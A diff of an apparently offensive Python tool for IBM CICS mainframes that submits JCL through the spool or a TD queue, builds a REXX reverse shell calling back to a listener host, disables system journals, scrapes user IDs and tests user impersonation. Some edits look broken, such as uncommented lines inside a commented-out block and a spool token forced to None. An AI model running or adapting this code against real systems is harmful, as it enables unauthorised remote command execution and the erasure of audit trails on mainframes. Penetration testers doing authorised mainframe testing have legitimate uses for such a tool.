@@ -17,7 +17,14 @@ SLEEP = 0.5
 AUTHENTICATED = False
 DO_AUTHENT = False
 
-# handle TDQueue
+# Write a CICS SHELL in COBOL
+# Distinguish VTAM authentication from CICS authentication
+# Change variable names
+# Add space automatically
+# Beautify the code...
+# Handle errors
+# Document the code
+#
 
 class bcolors:
     HEADER = '\033[95m'
@@ -63,7 +70,8 @@ parser.add_argument('--enable-trans',help='Enable a single transaction ',dest='e
 parser.add_argument('-q','--quiet',help='Remove Trailing and journal before performing any action',action='store_true',default=False,dest='journal')
 parser.add_argument('-u','--userids',help='Scrape userids found in different menus',action='store_true',default=False,dest='userids')
 parser.add_argument('-g','--surrogat',help='Checks wether you can impersonate another user when submitting a job', default=False,dest='surrogat_user')
-parser.add_argument('-s','--submit',help='Submit JCL to CICS server, default is a reverse shell in REXX',action='store_true',default=False,dest='submit')
+parser.add_argument('-s','--submit',help='Submit JCL to CICS server. Specify: dummy,reverse,custom (need -j option),cicsshell',dest='submit')
+parser.add_argument('--queue',help='Provides the name of the TD queue to submit a JOB',dest='queue')
 
 parser.add_argument('-l','--lhost',help='Remote server to call back to for reverse shell (host:port)',dest='lhost')
 parser.add_argument('-j','--jcl',help='Custom JCL file to provide',dest='jcl')
@@ -120,8 +128,8 @@ def do_authenticate(userid, password, pos_pass):
    elif any("Your password is invalid" in s for s in data):
       whine('Incorrect password information','err')
       sys.exit();
-      
-              
+    
+             
 def check_valid_applid(applid, do_authent, method = 1):
     em.send_string(applid) #CICS APPLID in VTAM
     em.send_enter()   
@@ -158,7 +166,7 @@ def check_valid_applid(applid, do_authent, method = 1):
     sleep();
     
     if em.find_response( 'DFHAC2001'):
-        whine('APPLID '+applid+' is valid',kind='good')
+        whine('Access to CICS Terminal is possible with APPID '+applid,'good')
         em.send_clear();
         return True
     elif method > 2:
@@ -203,13 +211,42 @@ def get_cics_value(request, identifier, double_enter=False):
     
     em.send_pf3();
     return out;
+
+def query_cics_scrap(request, pattern, length, depth, scrolls):
+    em.move_to(1,2);
+    em.safe_send(request+'                                              ');
+    em.send_enter();
+    out = []
+    i =0;
     
+    if depth == 1:
+       em.move_to(3,7)
+       em.send_enter();
+        
+    while i < scrolls:
+        em.send_pf11();
+        i +=1;
+    data = em.screen_get()
+         
+    for d in data:
+       if pattern in d:
+           pos= d.find(pattern) + len(pattern)
+           if d[pos:pos+length].strip() in out:
+              continue;
+           out.append(d[pos:pos+length].strip().replace(")",""))
+    
+    em.send_pf3();
+    if len(out) > 0:
+      return '\n'.join(out)
+    else:
+      return None;    
 
 def send_cics(request, double=False):
     em.send_clear();
     em.move_to(1,2);
     em.safe_send(request+'                                              ');
     em.send_enter();
+    
     if double:
        em.send_enter();
     data = em.screen_get()
@@ -218,9 +255,11 @@ def send_cics(request, double=False):
     else:
         return False
 
-def get_hql():
+def get_hql_files():
     em.move_to(1,2);
+    
     request = "CEMT I DSNAME"
+    
     em.safe_send(request+'                                              ');
     em.send_enter();
     
@@ -228,6 +267,29 @@ def get_hql():
     for d in data:
        if "Dsn" in d and "(DFH" not in d:
            pos= d.find("Dsn(") + len("Dsn(")
+           dataset =  d[pos:pos+44].strip()
+           em.send_pf3()
+           return dataset[:dataset.rfind(".")]+".**"
+    
+    em.send_pf3()
+    return None
+    
+def get_hql_libraries():
+    found_dfhrpl= False;
+    em.move_to(1,2);
+    
+    request = "CEMT I LIBRARY"
+    
+    em.safe_send(request+'                                              ');
+    em.send_enter();
+    
+    data = em.screen_get()
+    for d in data:
+       if "DFHRPL" in d:
+           found_dfhrpl=True;
+           continue
+       if found_dfhrpl:
+           pos= d.find("(") + len("(")
            dataset =  d[pos:pos+44].strip()
            em.send_pf3()
            return dataset[:dataset.rfind(".")]+".**"
@@ -249,7 +311,12 @@ def get_users():
     
     em.send_pf3()
     return out
-    
+
+def get_version():
+   version = query_cics_scrap("CEMT I SYS", "Cicstslevel(", 8, 0, 0 )
+   version = version.strip("0").replace("0",".")
+   return version     
+   
 def get_infos():
     cemt = True
     ceci = True
@@ -258,8 +325,12 @@ def get_infos():
     cedf = True
     cebr = False
     userid = ''
-    hlq = None
+    hlq_files = None
+    hlq_libraries = None
+    version = None
         
+    version = get_version();
+    whine("CICS TS Version "+version, 'good',1);
     #~ if query_cics('CEMT','Inquire',5):
       #~ cemt = True
       #~ em.send_pf3();
@@ -275,9 +346,9 @@ def get_infos():
     #~ if query_cics('CEDF ,OFF','EDF MODE OFF',1):
         #~ cedf = True
         #~ em.send_pf3();
-    if query_cics('CEBR','ENTER COMMAND',2):
-        cebr = True
-        em.send_pf3();
+    #~ if query_cics('CEBR','ENTER COMMAND',2):
+        #~ cebr = True
+        #~ em.send_pf3();
         
     em.send_clear()
     whine("Available IBM supplied transactions: ", 'info');
@@ -294,15 +365,21 @@ def get_infos():
     variables = ["USERID", "SYSID","NET","NATl"]
     values = get_cics_value('CECI ASSIGN', variables, True)        
     userid = values[0]; sysid = values[1]; netname = values[2]; language = values[3]
-    
-    hlq = get_hql();
+       
     
     whine("Userid: "+userid,'good',1);
     whine("Sysid: "+sysid,'good',1);
     whine("LU session name: "+netname,'good',1);
     whine("language: "+language,'good',1);
-    if hlq:
-       whine("HLQ:"+hlq,'good',1)
+    
+    hlq_files = get_hql_files();
+    hlq_libraries = get_hql_libraries();
+    
+    if hlq_files:
+       whine("Files HLQ:\t"+hlq_files,'good',1)
+    if hlq_libraries:
+       whine("Library path:\t"+hlq_libraries,'good',1)
+    
     whine("Active users", 'info');
     users = get_users();
     if users:
@@ -315,21 +392,24 @@ def get_infos():
     spool = send_cics('CECI SpoolOpen OUTPUT USERID(INTRDR  ) NODE(LOCAL   )',True)
     em.send_pf3();
     if cemt:
-        tdqueue = send_cics('CEMT INQUIRE TDQueue (IRDR)',True)
+        tdqueue = query_cics_scrap('CEMT INQUIRE TDQueue DDN (INREADER)', 'Tdq(', 4, 0, 0)
+        tdqueue2 = query_cics_scrap('CEMT INQUIRE TDQueue DDN (INTRDR)', 'Tdq(', 4, 0, 0)
+        
         em.send_pf3();    
     
     if spool and ceci:
         whine('Access to internal spool is apparently available','good',1);
                 
-    if tdqueue and ceci:
+    if (tdqueue or tdqueue2) and ceci:
         whine('Transiant queue to access spool is apparently available','good',1);
-            
+        whine('When submitting a job with TDQueue, provide the option --queue='+(tdqueue.strip('\n') if tdqueue else tdqueue2.strip('\n')),'good',2);
+       
+          
     if spool == False and tdqueue ==False:
         whine('No way to submit JCL through this CICS region','err',1);
     
     whine("Access control", 'info');
-    
-    
+        
     variables = ["READ"]
     read = get_cics_value('CECI QUERY SECURITY RESC(FACILITY) RESID(XXX) RESIDL(3) ', variables, True)
     read = ''.join(read)
@@ -350,8 +430,7 @@ def get_infos():
     #whine("Connection information", 'info');       
     
     #DB2: authtype, connectst, db2release, db2id
-    #MQ: ???
-        
+    #MQ: ???        
    
 def get_transactions(transid):
     
@@ -557,7 +636,7 @@ def dummy_jcl(lhost):
 /*EOF'''
     return dummy_jcl    
     
-def jcl_creator(lhost, username="CICSUSER"):
+def reverse_jcl(lhost, username="CICSUSER"):
 	
 	job_name = username
 	rexx_file = rand_name(randrange(3,6))
@@ -623,11 +702,11 @@ if sock = word(socklist,i) then return 1;end;return 0
  exec_cmd:
  parse arg sockID, do_it; parse var do_it do_it do_co
  SELECT
-  WHEN do_it = 'getuid' THEN DO
+  WHEN translate(do_it) = 'GETUID' THEN DO
     te=SOCKET('SEND',sockID, current_user()||nl);end
-  WHEN do_it = 'tso' | do_it = 'execute' THEN do
+  WHEN translate(do_it) = 'TSO' THEN do
    t=SOCKET('SEND',sockID, exec_tso(do_co)||nl);end
-  WHEN do_it = 'exit' THEN DO
+  WHEN translate(do_it) = 'EXIT' THEN DO
     call close_socket '1';exit;end;end
  te = SOCKET('SEND',sockID, 'Shell> ');return 1;
 /*
@@ -638,7 +717,7 @@ if sock = word(socklist,i) then return 1;end;return 0
  EX 'CICSUSER.REV5'
 /*
 //SYSIN    DD  DUMMY
-//"""
+/*EOF"""
 	return jcl_code
 
 def set_mixedCase(em):
@@ -677,10 +756,8 @@ def set_mixedCase(em):
     
 
 def open_spool():
-    #em.send_pf3();
-    #em.send_clear();
     
-    #sleep()
+    token = None
     em.move_to(1,2);
     request = "CECI SPOOLOPEN OUTPUT USERID('INTRDR  ') NODE('LOCAL   ') TOKEN(&TOKTEST)       "
     em.safe_send(request)
@@ -688,6 +765,7 @@ def open_spool():
     em.send_enter()
         
     data = em.screen_get()
+    
     for d in data:
         #print d
         token = None
@@ -699,14 +777,15 @@ def open_spool():
             break
     if "RESPONSE: NORMAL" not in data[22]:
         whine('Could not grab a valid token...a good chance the spool disabled, use -i to verify','err')
-        sys.exit();
+        
     return token
 
 def spool_write(token, jcl):
-    whine('Preparing JCL to submit','info')      
+    whine('Writting JCL to the spool (might take a few seconds)','info')      
     
     # write each line in a variable
     i = 0;
+    total = jcl.count("\n")
     for j in jcl.split("\n"):        
         # Go the variable screen
         em.send_pf5()
@@ -740,7 +819,7 @@ def spool_write(token, jcl):
         i += 1
         data = em.screen_get();
         if "RESPONSE: NORMAL" not in data[22]:
-            whine('Problem writting to the spool (line '+i+' of JCL)','err')
+            whine('Received error while writing JCL ('+str(i)+'):\n'+data[22],'err')
             sys.exit();
        
     whine('JCL Written successfully to the spool','good',1)   
@@ -758,25 +837,95 @@ def close_spool():
     if "RESPONSE: NORMAL" not in data[22]:
             whine('Problem submitting the spool','err')
             sys.exit();
-    whine('JOB submitted successfully to JES','good',1)
+    whine('JOB submitted successfully to JES. Might take a few seconds to connect back','good',1)
+
+def write_tdqueue(jcl):
+    em.move_to(1,2);
+    queue='ssss'
+    if not results.queue:
+       whine('No queue name provided, assuming default IRDR', 'info')
+    else:
+       queue = results.queue.upper()
+    if not (send_cics('CEMT INQUIRE TDQueue ('+queue+')',False)):
+        whine("No TDQueue named "+queue+" is installed on CICS",'err');
+        sys.exit();
     
-def submit_job(lhost, dummy=False):
-    #if (set_mixedCase(em)==-1):
-    #    sys.exit();
-    if results.jcl:
+    # activate TDQueue in case it was not
+    send_cics('Set TDQueue ('+queue+') OPE ENA',False)  
+    em.send_pf3();
+     
+    em.move_to(1,2)
+    request = "CECI ENQ RESOURCE("+queue+")                                                 "
+    em.safe_send(request)
+    em.send_enter();
+    
+    whine('Writing to the internal reader','info')
+    i = 0;
+    for j in jcl.split("\n"):        
+        # Go the variable screen
+        em.send_pf5()
+        
+        em.move_to(7,2)
+               
+        
+        em.send_eraseEOF()
+        em.send_enter();
+        
+        request = "&SQLKHDS  +00080"
+        em.safe_send(request);
+        em.send_enter();
+        #sleep()
+        
+               
+        em.move_to(7,24)
+        em.safe_send(j);        
+        em.send_enter();
+        #sleep()            
+        
+        # back to the normal screen
+        em.send_enter();
+        em.move_to(1,2)
+        request = "WriteQ TD Queue("+queue+") FROM(&SQLKHDS) LENGTH(80)                                           "
+        em.safe_send(request);
+        em.send_enter();  
+        em.send_enter();
+        
+        #show_screen();  
+        
+        i += 1
+        data = em.screen_get();
+        if "RESPONSE: NORMAL" not in data[22]:
+            whine('Received error while writing JCL ('+str(i)+'):\n'+data[22],'err')
+            sys.exit();
+     
+    request = "CECI DEQ RESOURCE("+queue+")                                                 "
+    em.safe_send(request)
+    em.send_enter();
+    whine('JCL Written to TDqueue, it should be executed any second','good',1)
+    
+  
+def submit_job(kind,lhost="192.168.1.28:4444"):
+    
+    if results.jcl and kind=="custom":
        f = open(results.jcl,"r")
        lines = f.readlines()
        jcl = ''.join(lines);
-    elif dummy:
+    
+    elif kind=="dummy":
         whine('Dummy JCL used for this attempt','info')
         jcl = dummy_jcl(lhost);
-    else:
-        jcl = jcl_creator(lhost)
+    elif kind=="reverse":
+        jcl = reverse_jcl(lhost)
         
     token = open_spool();
+    token = None
     if token:
         spool_write(token, jcl)
-    close_spool()
+        close_spool()
+    else:
+      em.send_pf3()
+      whine('Spool not available apparently, trying via TDQueue if available', 'info')
+      write_tdqueue(jcl);
 
 
 def activate_transaction(ena_trans):
@@ -824,35 +973,6 @@ def disable_journal():
     else:
        whine("Only DFHLOG is defined, cannot disable this system log",'err');
 
-def query_cics_scrap(request, pattern, length, depth, scrolls):
-    em.move_to(1,2);
-    em.safe_send(request+'                                              ');
-    em.send_enter();
-    out = []
-    i =0;
-    
-    if depth == 1:
-       em.move_to(3,7)
-       em.send_enter();
-        
-    while i < scrolls:
-        em.send_pf11();
-        i +=1;
-    data = em.screen_get()
-         
-    for d in data:
-       if pattern in d:
-           pos= d.find(pattern) + len(pattern)
-           if d[pos:pos+length].strip() in out:
-              continue;
-           out.append(d[pos:pos+length].strip().replace(")",""))
-    
-    em.send_pf3();
-    if len(out) > 0:
-      return '\n'.join(out)
-    else:
-      return None;
-
         
 def fetch_userids():
     tcl_u = query_cics_scrap("CEMT I TCL", "Installu(", 8, 0, 0)
@@ -889,6 +1009,66 @@ def check_surrogat(surrogat_user):
     else:
         whine('You cannot impersonate '+surrogat_user,'err',0);
 
+# Even if we define a TDQ pointing towards INTRDR, we need a valid DD INTRDR in the JCL Startup CICS
+#
+#~ def activate_tdq():
+    #~ if (send_cics('CEMT INQUIRE TDQueue (IRDR)',False)):
+        #~ send_cics('Set TDQueue (IRDR) OPE ENA',False)
+        #~ em.send_pf3();
+        #~ whine('TDQueue IRDR is enabled and opened','good')
+        #~ sys.exit();
+    #~ else:
+        #~ em.send_pf3();
+        #~ em.move_to(1,2)
+        #~ request = "CEDA DEF TD(IRDR) G(R5)                                                             "
+        #~ em.safe_send(request)
+        #~ em.send_enter();
+        #~ 
+        #~ em.move_to(7,22)
+        #~ em.safe_send("Extra")
+        #~ 
+        #~ em.move_to(9,22)
+        #~ em.safe_send("1")
+        #~ em.move_to(10,22)
+        #~ em.safe_send("INTRDR")
+        #~ 
+        #~ em.move_to(16,22)
+        #~ em.safe_send("Output")
+        #~ em.move_to(17,22)
+        #~ em.safe_send("80")
+        em.move_to(18,22)
+        em.safe_send("80")
+        #~ 
+        #~ em.move_to(19,22)
+        #~ em.safe_send('F')
+        #~ 
+        #~ em.move_to(20,22)
+        #~ em.safe_send('Unblocked')
+        #~ 
+      #~ 
+        #~ em.send_enter();
+        #~ 
+        #~ data = em.screen_get();
+        #~ 
+        #~ if "DEFINE SUCCESSFUL" in data[22]:
+            #~ whine("TDQueue IRDR, Group R2 defined successfully",'good',1)
+        #~ elif "Object already exists" in data[20]:
+            #~ whine("TDQueue IRDR, Group R2 already defined",'good',1)
+        #~ else:
+            #~ whine("Could not define TDQueue for some reason, make sure CEDA is available",'err')
+            #~ sys.exit();
+                        #~ 
+        #~ em.move_to(1,2)
+        #~ request = "INSTALL TDQueue(IRDR) Group(R5)"
+        #~ em.safe_send(request+"                                                 ")
+        #~ em.send_enter();
+        #~ 
+        #~ data = em.screen_get();
+        #~ if "INSTALL SUCCESSFUL" in data[22]:
+             #~ whine("TDQueue IRDR, Group R2 installed successfully",'good',1)        
+        #~ elif "already exists" in data[20]:
+            #~ whine("TDQueue IRDR, Group R2 already installed",'good',1)
+    
 # Some basic checks
 if (results.submit and (results.lhost == None or len(results.lhost.split(":")) < 2) and not results.jcl):
     whine('You must specify a connect back address with the option --lhost <LHOST:PORT> ','err')
@@ -899,9 +1079,7 @@ em = WrappedEmulator(False)
 connect_zOS(em, results.IP+":"+results.PORT)
 
 if (results.userid != None and results.password !=None):
-   #if (len(results.userid) > 7 or len(results.password > 7)):
-   #    whine('Userid and Passwords cannot be longer than 8 characters','err')
-    #   sys.exit();
+   
    DO_AUTHENT = True
    data = em.screen_get()   
    pos_pass=1;
@@ -922,14 +1100,6 @@ if (results.userid != None and results.password !=None):
 if not check_valid_applid(results.applid, DO_AUTHENT):
     whine("Applid "+results.applid+" not valid, try again maybe it's a network lag", "err")
     sys.exit();
-
-# Sometimes CICS is accessed without going through VTAM
-#if (results.userid != None and results.password !=None and not AUTHENTICATED ):
-#   cesn = True
-   
-      
-#if results.info == False and results.trans == False and results.files == False and results.submit == False and results.filename == None:
-#    results.info = True
 
 if results.info:
     whine("Getting information about CICS server (APPLID: "+results.applid+")", 'info')
@@ -969,7 +1139,7 @@ elif results.ena_trans:
     activate_transaction(results.ena_trans);
     
 elif results.submit:
-    submit_job(results.lhost);
+    submit_job(results.submit,results.lhost);
 
 elif results.journal:
     whine("Disabling journal before moving on", 'info')
@@ -982,6 +1152,7 @@ elif results.userids:
 elif results.surrogat_user:
     whine("Checking whether you can impersonate Userid "+results.surrogat_user, 'info')
     check_surrogat(results.surrogat_user)
+    
     
 def check_VTAM(em):
 	whine('Checking ifactivate in VTAM',kind='info')
